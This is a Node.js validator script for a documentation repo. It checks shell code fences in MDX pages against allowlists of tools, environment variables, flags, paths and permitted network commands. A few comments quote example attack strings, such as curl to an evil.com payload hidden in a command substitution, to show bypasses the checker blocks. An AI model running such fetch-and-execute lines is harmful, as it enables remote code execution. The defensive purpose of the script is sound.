#!/usr/bin/env node
/**
 * check-shell-commands.mjs
 *
 * Parses every bash/sh/shell code fence in shipped MDX pages and validates:
 *
 *   1. Executable names are in the known-tool allowlist.
 *   2. Flags are well-formed (--flag, -f, --flag=val, -f=val, or a bare
 *      argument whose shape fits that tool's expected patterns).
 *   3. Environment-variable assignments use UPPER_SNAKE_CASE names and
 *      are drawn from the documented variable allowlist.
 *   4. Local file/directory arguments that look like repo-relative paths
 *      (no placeholders, no http) actually exist on disk.
 *   5. Destructive or network-dependent commands are in an explicit
 *      per-command allowlist.
 *
 * Escape hatch: add `no-check` anywhere in the fence info string, e.g.
 *   ```bash no-check
 *
 * Run:
 *   node scripts/check-shell-commands.mjs
 * or via the package.json script:
 *   pnpm run check:shell-commands
 */

import { readFile, readdir } from "node:fs/promises";
import { existsSync } from "node:fs";
import path from "node:path";
import process from "node:process";

const repoRoot = process.cwd();

// ---------------------------------------------------------------------------
// Ignored directories (mirrors the rest of the checker suite).
// ---------------------------------------------------------------------------
const IGNORED_DIRS = new Set([
  ".git", ".github", "node_modules", ".next", "dist", "build",
]);

// ---------------------------------------------------------------------------
// Known-good executable names.
//
// The checker rejects any executable it doesn't recognise. Add new tools
// here (with a comment) when a page is added that uses them.
// ---------------------------------------------------------------------------
const KNOWN_TOOLS = new Set([
  // Shell builtins / POSIX utilities
  "cd", "echo", "export", "source", "cat", "ls", "mkdir", "rm", "cp", "mv",
  "chmod", "chown", "env", "set", "unset", "test", "true", "false",
  "read", "printf", "touch", "tee", "grep", "sed", "awk", "cut", "sort",
  "head", "tail", "wc", "find", "xargs", "which", "type", "hash",
  "sha256sum", "sha512sum", "md5sum", "xxd", "base64", "openssl",
  "curl", "wget",
  "git",
  "docker", "docker-compose",
  // Node / package managers
  "node", "npm", "npx", "pnpm", "yarn",
  // Python
  "python", "python3", "pip", "pip3",
  // Rust toolchain
  "cargo", "rustup", "rustc",
  // Stellar / Soroban CLIs
  "stellar", "soroban",
  // Solana / Anchor
  "anchor", "solana",
  // CKB
  "ckb-cli",
  // Phala / TEE
  "phala",
  // Prometheus
  "promtool",
  // Misc tools referenced in the docs
  "zbarcam",      // QR scanner in stealth-payments guide
  // Script references
  "./deploy.sh",
  // For-loop / control flow keywords (bash syntax, not executables)
  "for", "while", "do", "done", "if", "then", "else", "elif", "fi",
  "case", "esac", "in",
]);

// ---------------------------------------------------------------------------
// Documented environment variable names.
//
// Every variable that appears in a checkable shell fence must be in this
// set. Add new variables when a page introduces them.
// ---------------------------------------------------------------------------
const KNOWN_ENV_VARS = new Set([
  // Stellar network config
  "STELLAR_NETWORK",
  "STELLAR_NETWORK_PASSPHRASE",
  "STELLAR_RPC_URL",
  "STELLAR_RPC_URL_PRIMARY",
  "STELLAR_RPC_URL_FALLBACK",
  "STELLAR_HORIZON_URL",
  // Stellar contract IDs
  "STELLAR_ANNOUNCER_CONTRACT_ID",
  "STELLAR_NAMES_CONTRACT_ID",
  "STELLAR_REGISTRY_CONTRACT_ID",
  "STELLAR_SENDER_CONTRACT_ID",
  // Stellar secrets / keys (placeholder values are expected)
  "STELLAR_SECRET",
  "STELLAR_OPERATOR_SECRET",
  "STELLAR_SIGNING_KEY",
  "SPONSOR_SECRET",
  "SENDER_SECRET",
  // Wraith API
  "WRAITH_API_KEY",
  "AGENT_ID",
  // Nuxt / framework public vars
  "NUXT_PUBLIC_WRAITH_API_KEY",
  // CI / script helpers
  "ADDR",
  "SIGNED_XDR",
  "MINTLIFY_PREVIEW_URL",
  "DOCS_DIFF_BASE",
  "DOCS_DIFF_HEAD",
]);

// ---------------------------------------------------------------------------
// Destructive or network-dependent command patterns that are allowed because
// they appear in deployment / ops documentation that is inherently live.
//
// Each entry is a RegExp tested against the normalised command line (prompt
// stripped, leading whitespace removed). The accompanying note explains why
// it is permitted.
// ---------------------------------------------------------------------------
const NETWORK_ALLOWLIST = [
  // Friendbot — testnet/futurenet only, used in quickstart and ops guides.
  /^curl\s+"?https:\/\/friendbot(-futurenet)?\.stellar\.org/,
  // Friendbot via stellar CLI subshell.
  /^curl\s+"?https:\/\/friendbot(-futurenet)?\.stellar\.org\/\?addr=\$\(stellar\s+keys\s+address/,
  // Wraith API examples — the canonical external endpoint.
  /^curl\s+(-[A-Za-z]\s+)*(-X\s+\w+\s+)?https:\/\/api\.usewraith\.xyz\//,
  // Horizon testnet health-check used in stellar-quickstart.
  /^curl\s+"?https:\/\/horizon-testnet\.stellar\.org\/?"/,
  // Horizon testnet health-check (unquoted form).
  /^curl\s+https:\/\/horizon-testnet\.stellar\.org\/?/,
  // Local Grafana dashboard import — localhost only.
  /^curl\s+-X\s+POST\s+http:\/\/localhost:/,
  // Spectre self-hosted instance health-check (placeholder URL).
  /^curl\s+https:\/\/your-spectre-instance\.com\/health/,
  // stellar account fund — testnet/mainnet deployment documented in ops guide.
  /^stellar\s+account\s+fund\s+/,
  // stellar keys generate / stellar keys address — local key management.
  /^stellar\s+keys\s+(generate|address|show)\s+/,
  // stellar account show — read-only query.
  /^stellar\s+account\s+show\s+/,
  // stellar account set-options — multisig setup in mainnet deployment guide.
  /^stellar\s+account\s+set-options\s+/,
  // stellar contract fetch — read-only WASM retrieval.
  /^stellar\s+contract\s+fetch\s+/,
  // soroban contract build — local compilation, no network.
  /^soroban\s+contract\s+build$/,
  // soroban contract info — read-only query.
  /^soroban\s+contract\s+info\s+/,
  // soroban contract invoke — invocations in wraith-names guides (testnet).
  /^soroban\s+contract\s+invoke\s+/,
  // git clone — used in self-hosted deployment guide.
  /^git\s+clone\s+https:\/\/github\.com\/wraith-protocol\//,
  // docker buildx build — TEE image build in architecture/tee.mdx.
  /^docker\s+buildx\s+build\s+/,
  // phala deploy — TEE deployment in architecture/tee.mdx.
  /^phala\s+deploy\s+/,
  // anchor deploy — Solana devnet deployment in contracts/solana.mdx.
  /^anchor\s+deploy\s+/,
  // anchor build — local compilation.
  /^anchor\s+build$/,
  // anchor test — Solana test suite.
  /^anchor\s+test$/,
  // ckb-cli deploy — CKB deployment in contracts/ckb.mdx.
  /^ckb-cli\s+deploy\s+/,
  // ./deploy.sh — self-hosted deployment script.
  /^\.\/deploy\.sh\s+/,
  // rustup target add — local toolchain change, no network effect.
  /^rustup\s+target\s+add\s+/,
  // cargo build / run — local compilation.
  /^cargo\s+(build|run)\s+/,
  // promtool check rules — local linting, no network.
  /^promtool\s+check\s+rules\s+/,
  // pip install — Python dependency install in quickstart.
  /^pip\s+install\s+/,
  // npm install / npx — documented package install commands.
  /^npm\s+install\s+/,
  /^npm\s+run\s+/,
  /^pnpm\s+run\s+/,
  /^pnpm\s+install\s+/,
  /^npx\s+/,
];

// ---------------------------------------------------------------------------
// Local path argument validation.
//
// If a command line contains what looks like a bare repo-relative path
// (no placeholders, no http, starts with a known shipped directory name or
// ends in a known extension) we verify the path exists on disk.
// ---------------------------------------------------------------------------
const SHIPPED_DIR_PREFIXES = [
  "guides/", "reference/", "scripts/", "sdk/",
  "api-reference/", "architecture/",
  // Note: contracts/ is intentionally excluded — the contracts source tree
  // lives in a separate repository and is not present in this docs repo.
  // Paths like contracts/stellar/stealth-announcer are cross-repo references.
];

const PATH_LIKE_EXTENSIONS = new Set([
  ".json", ".yml", ".yaml", ".toml", ".sh", ".ts", ".js", ".mjs",
  ".mdx", ".md", ".rs", ".py",
]);

// ---------------------------------------------------------------------------
// Fence-level escape-hatch annotation.
//
// When a command in a fence is genuinely illustrative and contains tokens
// that can never pass structural checks (e.g. prose sentences or partial
// commands), add `no-check` to the fence info string to skip the entire
// fence.  For finer-grained skipping within a fence, end the line with
// `# no-check`.
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// Exports — pure functions used by check-shell-commands.test.mjs
// ---------------------------------------------------------------------------

export {
  validateFence,
  buildLogicalLines,
  splitCommandSegments,
  tokenise,
  validateFlags,
  validateLocalPaths,
  looksLikeLocalPath,
  extractCommandSubstitutions,
  validateCommandSubstitutions,
  KNOWN_TOOLS,
  KNOWN_ENV_VARS,
  NETWORK_ALLOWLIST,
  TOOL_FLAGS,
};

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------

async function main() {  const files = await findMdxFiles(repoRoot);
  const fences = await collectFences(files);

  const checkable = fences.filter((f) => !/\bno-check\b/.test(f.attrs));
  const skipped   = fences.length - checkable.length;

  const errors = [];

  for (const fence of checkable) {
    errors.push(...validateFence(fence));
  }

  const summary = [
    `MDX files scanned : ${files.length}`,
    `Shell fences found: ${fences.length}`,
    `Skipped (no-check): ${skipped}`,
    `Checked           : ${checkable.length}`,
    `Errors            : ${errors.length}`,
  ].join("\n");

  if (errors.length > 0) {
    const report = errors.map((e) => `  - ${e}`).join("\n");
    console.error(
      `${summary}\n\nShell command validation failed:\n${report}`,
    );
    process.exit(1);
  }

  console.log(`${summary}\n\nAll shell command checks passed.`);
}

// ---------------------------------------------------------------------------
// Fence collection
// ---------------------------------------------------------------------------

/** @typedef {{ file: string, line: number, lang: string, attrs: string, code: string }} Fence */

/** @returns {Promise<Fence[]>} */
async function collectFences(files) {
  const fences = [];
  const fenceRe = /^```(bash|sh|shell)([^\n]*)\n([\s\S]*?)^```/gm;

  for (const file of files) {
    const src  = await readFile(file, "utf8");
    const rel  = path.relative(repoRoot, file);
    let match;
    while ((match = fenceRe.exec(src)) !== null) {
      fences.push({
        file:  rel,
        line:  lineNumberAt(src, match.index),
        lang:  match[1],
        attrs: match[2].trim(),
        code:  match[3],
      });
    }
  }
  return fences;
}

// ---------------------------------------------------------------------------
// Fence validation
// ---------------------------------------------------------------------------

/**
 * Validates a single fence and returns an array of error strings.
 * @param {Fence} fence
 * @returns {string[]}
 */
function validateFence(fence) {
  const errors = [];
  const location = `${fence.file}:${fence.line}`;

  // Logical lines: a physical line ending in \ continues onto the next.
  const logicalLines = buildLogicalLines(fence.code);

  for (const raw of logicalLines) {
    // Strip trailing comments and whitespace.
    const noComment = raw.replace(/\s+#(?!\s*no-check).*$/, "").trim();

    // Per-line no-check annotation.
    if (/\bno-check\b/.test(raw)) continue;

    // Skip blank lines.
    if (!noComment) continue;

    // Strip leading shell prompt ($ or >) used in docs examples.
    const promptStripped = noComment.replace(/^[$>]\s+/, "");
    if (!promptStripped) continue;

    // Skip pure comment lines (# ...).
    if (promptStripped.startsWith("#")) continue;

    // Split on compound operators (;, &&, ||, |) so every command segment
    // is validated independently.  We must respect quoting so that operators
    // inside strings (e.g. a JSON value) are not treated as separators.
    const segments = splitCommandSegments(promptStripped);

    for (const segment of segments) {
      const line = segment.trim();
      if (!line) continue;
      if (line.startsWith("#")) continue;

      // Allow standalone operator tokens that splitCommandSegments may emit
      // when the line starts with one (e.g. a leading pipe in a here-doc).
      if (["|", "||", "&&", ";", "\\"].includes(line)) continue;

      // ---------- Environment-variable prefix(es) ----------
      // A segment may start with one or more VAR=value assignments before
      // the actual command, e.g. "STELLAR_NETWORK=testnet soroban ...".
      // We consume all leading assignments and then fall through to validate
      // the remaining command (if any).
      let remaining = line;
      while (remaining) {
        // Match VAR= followed by: a quoted string, a $(...) or `...`
        // command substitution, or a run of non-space chars.
        const envMatch = remaining.match(
          /^([A-Za-z_][A-Za-z0-9_]*)=((?:"[^"]*"|'[^']*'|\$\([^)]*\)|`[^`]*`|\S)*)\s*/,
        );
        if (!envMatch) break;

        const varName = envMatch[1];
        // Only flag all-caps env var names as documented variables.
        if (/^[A-Z][A-Z0-9_]*$/.test(varName)) {
          if (!KNOWN_ENV_VARS.has(varName)) {
            errors.push(
              `${location}: undocumented environment variable '${varName}' — ` +
              `add it to KNOWN_ENV_VARS in scripts/check-shell-commands.mjs if it is intentional`,
            );
          }
        }

        // ---------- Command substitutions inside the assignment value ----------
        // e.g. SIGNED_XDR=$(totally-unknown-tool --steal) must be caught here.
        const assignValue = envMatch[2] ?? "";
        validateCommandSubstitutions(assignValue, location, errors);

        remaining = remaining.slice(envMatch[0].length).trim();
      }

      // After stripping env-var prefixes, if nothing is left this segment
      // was a pure assignment — nothing further to validate.
      if (!remaining) continue;

      // If remaining starts with a subshell/command-substitution token the
      // whole segment is a variable capture expression (e.g. VAR=$(cmd …)).
      // The inner command is not a top-level executable to validate here —
      // but we DO validate the executable inside the substitution itself.
      if (remaining.startsWith("$(") || remaining.startsWith("`")) {
        validateCommandSubstitutions(remaining, location, errors);
        continue;
      }

      // ---------- Executable name ----------
      const tokens = tokenise(remaining);
      if (tokens.length === 0) continue;

      const exe = tokens[0];

      // Allow variable expansions like $SIGNED_XDR, $(…), `…` as first token.
      if (exe.startsWith("$") || exe.startsWith("`")) continue;

      // Allow line continuations or pipeline operators as first token.
      if (["|", "||", "&&", ";", "\\"].includes(exe)) continue;

      if (!KNOWN_TOOLS.has(exe)) {
        errors.push(
          `${location}: unknown executable '${exe}' — ` +
          `add it to KNOWN_TOOLS in scripts/check-shell-commands.mjs if it is a real tool`,
        );
        continue; // No point validating flags of an unknown tool.
      }

      // ---------- Command substitutions in argument positions ----------
      // e.g. echo $(totally-unknown-tool --steal) must be caught here.
      // We scan the full `remaining` string (which includes all arguments).
      validateCommandSubstitutions(remaining, location, errors);

      // ---------- Network / destructive command allowlist ----------
      const isNetworkOrDestructive = isNetworkCommand(exe, tokens);
      if (isNetworkOrDestructive) {
        if (!NETWORK_ALLOWLIST.some((re) => re.test(remaining))) {
          errors.push(
            `${location}: network/destructive command not in allowlist: '${remaining.slice(0, 80)}' — ` +
            `add a pattern to NETWORK_ALLOWLIST in scripts/check-shell-commands.mjs`,
          );
        }
        // Don't validate flags on allowlisted commands — their shapes vary widely.
        continue;
      }

      // ---------- Flag well-formedness ----------
      const flagErrors = validateFlags(exe, tokens.slice(1), location, remaining);
      errors.push(...flagErrors);

      // ---------- Local path arguments ----------
      const pathErrors = validateLocalPaths(tokens.slice(1), location);
      errors.push(...pathErrors);
    }
  }

  return errors;
}

// ---------------------------------------------------------------------------
// Logical line building (handle backslash continuations)
// ---------------------------------------------------------------------------

/** @param {string} code @returns {string[]} */
function buildLogicalLines(code) {
  const physical = code.split("\n");
  const logical  = [];
  let current    = "";
  let inSingle   = false;
  let inDouble   = false;

  for (const line of physical) {
    // Track quote state across the accumulated current buffer + this line.
    for (let i = 0; i < line.length; i++) {
      const ch = line[i];
      if (inSingle) {
        if (ch === "'") inSingle = false;
      } else if (inDouble) {
        if (ch === '"' && (i === 0 || line[i - 1] !== "\\")) inDouble = false;
      } else {
        if (ch === "'") inSingle = true;
        else if (ch === '"') inDouble = true;
      }
    }

    if (line.endsWith("\\") && !inSingle && !inDouble) {
      // Explicit line continuation — join without the backslash.
      current += line.slice(0, -1) + " ";
    } else if (inSingle || inDouble) {
      // Inside an open quote that spans lines — join with a space.
      current += line + " ";
    } else {
      current += line;
      logical.push(current);
      current = "";
    }
  }
  if (current) logical.push(current);
  return logical;
}

// ---------------------------------------------------------------------------
// Compound operator splitting (;, &&, ||, |)
// ---------------------------------------------------------------------------

/**
 * Splits a single logical line into individual command segments by splitting
 * on unquoted `;`, `&&`, `||`, and `|` operators.  Quoted regions are
 * respected so that operators inside strings are not treated as separators.
 * The quote characters themselves are preserved in the output segments.
 *
 * @param {string} line
 * @returns {string[]}  non-empty segment strings, operators themselves excluded
 */
function splitCommandSegments(line) {
  const segments = [];
  let current  = "";
  let inSingle = false;
  let inDouble = false;

  for (let i = 0; i < line.length; i++) {
    const ch = line[i];

    if (inSingle) {
      current += ch;
      if (ch === "'") inSingle = false;
      continue;
    }
    if (inDouble) {
      current += ch;
      if (ch === '"' && (i === 0 || line[i - 1] !== "\\")) inDouble = false;
      continue;
    }

    if (ch === "'") { inSingle = true; current += ch; continue; }
    if (ch === '"') { inDouble = true; current += ch; continue; }

    // Two-character operators: &&, ||
    if ((ch === "&" || ch === "|") && line[i + 1] === ch) {
      const seg = current.trim();
      if (seg) segments.push(seg);
      current = "";
      i++; // skip the second character
      continue;
    }

    // Single-character operators: ; or |
    if (ch === ";" || ch === "|") {
      const seg = current.trim();
      if (seg) segments.push(seg);
      current = "";
      continue;
    }

    current += ch;
  }

  const last = current.trim();
  if (last) segments.push(last);
  return segments;
}

// ---------------------------------------------------------------------------
// Tokeniser
// ---------------------------------------------------------------------------

/**
 * Splits a command line into tokens, respecting basic quoting.
 * Sufficient for flag validation; not a full shell parser.
 * @param {string} line
 * @returns {string[]}
 */
function tokenise(line) {
  const tokens = [];
  let current  = "";
  let inSingle = false;
  let inDouble = false;

  for (let i = 0; i < line.length; i++) {
    const ch = line[i];
    if (inSingle) {
      if (ch === "'") inSingle = false;
      else current += ch;
    } else if (inDouble) {
      if (ch === '"') inDouble = false;
      else current += ch;
    } else if (ch === "'") {
      inSingle = true;
    } else if (ch === '"') {
      inDouble = true;
    } else if (ch === " " || ch === "\t") {
      if (current) { tokens.push(current); current = ""; }
    } else {
      current += ch;
    }
  }
  if (current) tokens.push(current);
  return tokens;
}

// ---------------------------------------------------------------------------
// Command-substitution extraction and recursive validation
// ---------------------------------------------------------------------------

/**
 * Extracts the body text of every `$(...)` and `\`...\`` command substitution
 * present in `text`.  Nested `$(...)` are handled by tracking parenthesis
 * depth so that `$(echo $(date))` yields both `echo $(date)` and `date`.
 *
 * @param {string} text  — any shell fragment (assignment value, argument, …)
 * @returns {string[]}   — array of substitution body strings (inner text only)
 */
function extractCommandSubstitutions(text) {
  const bodies = [];
  let i = 0;

  while (i < text.length) {
    // $( ... ) — track depth for nesting
    if (text[i] === "$" && text[i + 1] === "(") {
      i += 2; // skip "$("
      let depth = 1;
      let body = "";
      while (i < text.length && depth > 0) {
        const ch = text[i];
        if (ch === "(") depth++;
        else if (ch === ")") {
          depth--;
          if (depth === 0) { i++; break; }
        }
        body += ch;
        i++;
      }
      if (body) bodies.push(body);
      // Recurse into the body so nested substitutions are also captured.
      bodies.push(...extractCommandSubstitutions(body));
      continue;
    }

    // `...` — backtick form (no nesting allowed by POSIX, so just scan to
    // the next unescaped backtick)
    if (text[i] === "`") {
      i++; // skip opening backtick
      let body = "";
      while (i < text.length && text[i] !== "`") {
        if (text[i] === "\\" && i + 1 < text.length) {
          // Consume escape sequence but include only the escaped char.
          body += text[i + 1];
          i += 2;
        } else {
          body += text[i];
          i++;
        }
      }
      i++; // skip closing backtick
      if (body) bodies.push(body);
      bodies.push(...extractCommandSubstitutions(body));
      continue;
    }

    i++;
  }

  return bodies;
}

/**
 * Validates every command substitution found in `text` through the same full
 * pipeline as top-level commands: executable allowlist, network/destructive
 * allowlist, flag well-formedness, and local-path existence.
 *
 * Previously this function only checked whether the executable name was
 * known, which let `curl https://evil.com/payload` inside `$(…)` or `\`…\``
 * bypass the network allowlist entirely.
 *
 * @param {string}   text      — shell fragment to scan (may contain $(...)/`...`)
 * @param {string}   location  — "file:line" for error messages
 * @param {string[]} errors    — mutable array to append errors into
 */
function validateCommandSubstitutions(text, location, errors) {
  const bodies = extractCommandSubstitutions(text);
  for (const body of bodies) {
    // Each body may itself be a compound command (e.g. `foo; bar` or `foo | bar`).
    // Split it the same way the outer validator does so every segment is checked.
    const segments = splitCommandSegments(body.trim());

    for (const segment of segments) {
      const bodyTrimmed = segment.trim();
      if (!bodyTrimmed) continue;
      if (bodyTrimmed.startsWith("#")) continue;
      if (["|", "||", "&&", ";", "\\"].includes(bodyTrimmed)) continue;

      // Strip any leading env-var assignments inside the substitution body
      // (e.g. `$(FOO=bar curl https://evil.com)` must still catch curl).
      let remaining = bodyTrimmed;
      while (remaining) {
        const envMatch = remaining.match(
          /^([A-Za-z_][A-Za-z0-9_]*)=((?:"[^"]*"|'[^']*'|\$\([^)]*\)|`[^`]*`|\S)*)\s*/,
        );
        if (!envMatch) break;

        const varName = envMatch[1];
        if (/^[A-Z][A-Z0-9_]*$/.test(varName) && !KNOWN_ENV_VARS.has(varName)) {
          errors.push(
            `${location}: undocumented environment variable '${varName}' inside command substitution — ` +
            `add it to KNOWN_ENV_VARS in scripts/check-shell-commands.mjs if it is intentional`,
          );
        }

        // Recurse into the assignment value in case it contains further substitutions.
        validateCommandSubstitutions(envMatch[2] ?? "", location, errors);
        remaining = remaining.slice(envMatch[0].length).trim();
      }

      if (!remaining) continue;

      // Tokenise the remaining command.
      const tokens = tokenise(remaining);
      if (tokens.length === 0) continue;

      const exe = tokens[0];

      // Skip variable expansions or operator tokens as the "executable".
      if (exe.startsWith("$") || exe.startsWith("`")) continue;
      if (["|", "||", "&&", ";", "\\"].includes(exe)) continue;

      // ---- Unknown executable ----
      if (!KNOWN_TOOLS.has(exe)) {
        errors.push(
          `${location}: unknown executable '${exe}' inside command substitution — ` +
          `add it to KNOWN_TOOLS in scripts/check-shell-commands.mjs if it is a real tool`,
        );
        continue; // No point running further checks on an unknown tool.
      }

      // ---- Network / destructive allowlist ----
      // Apply exactly the same check as for top-level commands: if the
      // executable is a network/destructive tool the full command string must
      // match one of the allowlist patterns.
      if (isNetworkCommand(exe, tokens)) {
        if (!NETWORK_ALLOWLIST.some((re) => re.test(remaining))) {
          errors.push(
            `${location}: network/destructive command not in allowlist (inside command substitution): ` +
            `'${remaining.slice(0, 80)}' — ` +
            `add a pattern to NETWORK_ALLOWLIST in scripts/check-shell-commands.mjs`,
          );
        }
        // Don't validate flags on allowlisted network commands — shapes vary widely.
        continue;
      }

      // ---- Flag well-formedness ----
      errors.push(...validateFlags(exe, tokens.slice(1), location, remaining));

      // ---- Local path arguments ----
      errors.push(...validateLocalPaths(tokens.slice(1), location));
    }
  }
}

// ---------------------------------------------------------------------------
// Flag validation
// ---------------------------------------------------------------------------

/**
 * Flags that are allowed for each tool. Maps executable name to a Set of
 * accepted long/short flag names (without dashes). `"*"` means accept any
 * well-formed flag for that tool.
 */
const TOOL_FLAGS = {
  // npm install — packages are bare arguments, no flags validated here.
  npm:      new Set(["install", "run", "exec", "ci", "audit", "pack", "remove",
                     "save", "save-dev", "D", "g", "global", "legacy-peer-deps",
                     "frozen-lockfile", "no-frozen-lockfile", "prefix", "workspace"]),
  // pnpm — same surface as npm for the docs.
  pnpm:     new Set(["install", "run", "add", "remove", "exec", "audit",
                     "frozen-lockfile", "no-frozen-lockfile", "prod", "dev",
                     "audit-level", "D", "g", "peers"]),
  // npx — anything goes (the command is the argument).
  npx:      "*",
  // git
  git:      new Set(["clone", "pull", "push", "commit", "add", "status",
                     "checkout", "branch", "merge", "rebase", "log", "diff",
                     "fetch", "tag", "init", "remote", "submodule",
                     "config", "clean", "stash", "reset", "format-patch",
                     "am", "apply"]),
  // curl — validate well-known flags
  curl:     new Set(["X", "H", "d", "f", "o", "O", "L", "s", "S", "v",
                     "silent", "location", "output", "data", "header",
                     "request", "fail", "verbose", "include", "write-out",
                     "max-time", "retry", "compressed", "insecure",
                     "user", "user-agent", "cookie", "cookie-jar",
                     "upload-file", "form", "proxy"]),
  // node
  node:     new Set(["e", "r", "p", "v", "version", "eval", "print",
                     "require", "input-type", "experimental-vm-modules",
                     "no-warnings", "max-old-space-size"]),
  // pip / pip3
  pip:      new Set(["install", "uninstall", "list", "show", "freeze",
                     "download", "wheel", "hash", "check", "config",
                     "r", "q", "quiet", "verbose", "no-cache-dir",
                     "upgrade", "U", "user", "target", "prefix",
                     "index-url", "extra-index-url", "no-deps",
                     "requirement", "constraint"]),
  // cargo
  cargo:    new Set(["build", "run", "test", "check", "clean", "doc",
                     "publish", "update", "fetch", "init", "new",
                     "add", "remove", "search", "install", "uninstall",
                     "bench", "fix", "generate-lockfile",
                     "target", "release", "features", "all-features",
                     "no-default-features", "manifest-path", "package",
                     "p", "jobs", "j", "quiet", "q", "verbose", "v",
                     "locked", "frozen", "offline"]),
  // rustup
  rustup:   new Set(["toolchain", "target", "component", "update",
                     "show", "install", "uninstall", "add", "remove",
                     "list", "default", "override", "run", "which",
                     "doc", "man", "set"]),
  // rustc
  rustc:    new Set(["edition", "crate-type", "error-format", "cap-lints",
                     "out-dir", "o", "C", "Z", "W", "A", "allow",
                     "deny", "warn", "forbid", "target", "extern",
                     "L", "l", "print"]),
  // sha256sum
  sha256sum: new Set(["check", "c", "b", "binary", "text", "t",
                      "quiet", "status", "warn", "ignore-missing"]),
  // echo — anything is a valid argument
  echo:     "*",
  // cd — anything is a valid argument
  cd:       "*",
  // docker
  docker:   "*",
  // stellar CLI
  stellar:  "*",
  // soroban CLI
  soroban:  "*",
  // anchor (Solana)
  anchor:   "*",
  // ckb-cli
  "ckb-cli": "*",
  // phala
  phala:    "*",
  // promtool
  promtool: "*",
  // zbarcam
  zbarcam:  "*",
  // ./deploy.sh
  "./deploy.sh": "*",
  // shell control-flow keywords — no flags
  for: "*", while: "*", do: "*", done: "*", if: "*", then: "*",
  else: "*", elif: "*", fi: "*", case: "*", esac: "*", in: "*",
  // other utils
  cat: "*", ls: "*", mkdir: "*", rm: "*", cp: "*", mv: "*",
  chmod: "*", chown: "*", env: "*", export: "*", source: "*",
  set: "*", unset: "*", test: "*", true: "*", false: "*",
  read: "*", printf: "*", touch: "*", tee: "*", grep: "*",
  sed: "*", awk: "*", cut: "*", sort: "*", head: "*", tail: "*",
  wc: "*", find: "*", xargs: "*", which: "*", type: "*",
  hash: "*", sha512sum: "*", md5sum: "*", xxd: "*", base64: "*",
  openssl: "*", wget: "*",
};

/**
 * @param {string} exe
 * @param {string[]} args   tokens after the executable
 * @param {string}   location
 * @param {string}   line
 * @returns {string[]}
 */
function validateFlags(exe, args, location, line) {
  const allowed = TOOL_FLAGS[exe];
  if (allowed === "*") return [];
  if (!allowed)        return []; // unknown tool already reported

  const errors = [];
  for (const arg of args) {
    // Placeholder values like <FOO> or <FOO_BAR> are expected in docs.
    if (/^<[^>]+>$/.test(arg)) continue;
    // Shell variable expansions.
    if (/^\$/.test(arg)) continue;
    // Subshell / command substitution.
    if (/^\$\(/.test(arg) || /^`/.test(arg)) continue;
    // Bare arguments (package names, URLs, file paths, positional args).
    if (!/^-/.test(arg)) continue;

    // Long flag: --flag or --flag=val
    const longMatch = arg.match(/^--([A-Za-z][-A-Za-z0-9]*)(?:=.*)?$/);
    if (longMatch) {
      const flagName = longMatch[1];
      if (!allowed.has(flagName)) {
        errors.push(
          `${location}: unrecognised flag '${arg}' for '${exe}' — ` +
          `add '${flagName}' to TOOL_FLAGS['${exe}'] if it is valid`,
        );
      }
      continue;
    }

    // Short flag: -f or -f=val or combined -abc
    const shortMatch = arg.match(/^-([A-Za-z0-9]+)(?:=.*)?$/);
    if (shortMatch) {
      // For multi-char short combos (-abc), check each char.
      for (const ch of shortMatch[1]) {
        if (!allowed.has(ch)) {
          errors.push(
            `${location}: unrecognised short flag '-${ch}' (in '${arg}') for '${exe}' — ` +
            `add '${ch}' to TOOL_FLAGS['${exe}'] if it is valid`,
          );
        }
      }
      continue;
    }

    // Anything else starting with - is malformed.
    errors.push(
      `${location}: malformed flag '${arg}' for '${exe}' in: ${line.slice(0, 80)}`,
    );
  }
  return errors;
}

// ---------------------------------------------------------------------------
// Network / destructive command detection
// ---------------------------------------------------------------------------

const NETWORK_EXECUTABLES = new Set([
  "curl", "wget",
  "git",
  "docker",
  "stellar", "soroban",
  "anchor",
  "ckb-cli",
  "phala",
  "./deploy.sh",
  "rustup",
  "cargo",
  "pip",
  "npm",
  "npx",
  "pnpm",
  "promtool",
]);

/**
 * @param {string}   exe
 * @param {string[]} tokens
 * @returns {boolean}
 */
function isNetworkCommand(exe, tokens) {
  return NETWORK_EXECUTABLES.has(exe);
}

// ---------------------------------------------------------------------------
// Local path validation
// ---------------------------------------------------------------------------

/**
 * @param {string[]} args
 * @param {string}   location
 * @returns {string[]}
 */
function validateLocalPaths(args, location) {
  const errors = [];
  for (const arg of args) {
    if (!looksLikeLocalPath(arg)) continue;
    const resolved = path.join(repoRoot, arg);
    if (!existsSync(resolved)) {
      errors.push(
        `${location}: referenced path '${arg}' does not exist on disk`,
      );
    }
  }
  return errors;
}

/**
 * A token looks like a local path if:
 *  - it doesn't start with - (not a flag)
 *  - it doesn't start with $ or < (not a variable or placeholder)
 *  - it doesn't start with http (not a URL)
 *  - it starts with a known shipped directory prefix
 *    (bare filenames like submit.js are example/illustrative files, skip them)
 *  - it contains no spaces (already tokenised away)
 * @param {string} token
 * @returns {boolean}
 */
function looksLikeLocalPath(token) {
  if (token.startsWith("-"))    return false;
  if (token.startsWith("$"))    return false;
  if (token.startsWith("<"))    return false;
  if (token.startsWith("http")) return false;
  if (token.startsWith("@"))    return false;  // npm package scope
  // Only check paths that start with a known shipped directory prefix.
  // Bare filenames (e.g. submit.js, sign.js, deployment.toml) are
  // illustrative examples that won't exist in the docs repo.
  return SHIPPED_DIR_PREFIXES.some((p) => token.startsWith(p));
}

// ---------------------------------------------------------------------------
// MDX file discovery
// ---------------------------------------------------------------------------

async function findMdxFiles(dir) {
  const entries = await readdir(dir, { withFileTypes: true });
  const nested  = await Promise.all(
    entries.map(async (entry) => {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) {
        return IGNORED_DIRS.has(entry.name) ? [] : findMdxFiles(full);
      }
      return entry.isFile() && entry.name.endsWith(".mdx") ? [full] : [];
    }),
  );
  return nested.flat().sort();
}

// ---------------------------------------------------------------------------
// Utilities
// ---------------------------------------------------------------------------

function lineNumberAt(text, index) {
  return text.slice(0, index).split("\n").length;
}

// ---------------------------------------------------------------------------
// Run
// ---------------------------------------------------------------------------

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
